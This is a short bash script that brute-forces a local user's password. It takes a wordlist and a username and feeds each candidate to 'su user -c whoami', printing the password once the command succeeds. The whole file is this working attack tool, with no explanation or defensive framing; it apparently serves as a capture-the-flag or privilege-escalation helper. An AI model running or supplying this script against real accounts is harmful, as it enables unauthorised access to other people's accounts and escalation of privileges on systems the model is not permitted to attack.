#!/bin/bash

while getopts w:u: flag
do
    case "${flag}" in
        w) wordlist=${OPTARG};;
        u) user=${OPTARG};;
    esac
done

while read pass;
do
    res=$(echo $pass | su $user -c whoami 2>/dev/null)
    if [[ ! -z $res &&  $res == $user ]]; then
            echo "The password is $pass :D";
            exit 0;
    fi
done < $wordlist

echo "No password found :("
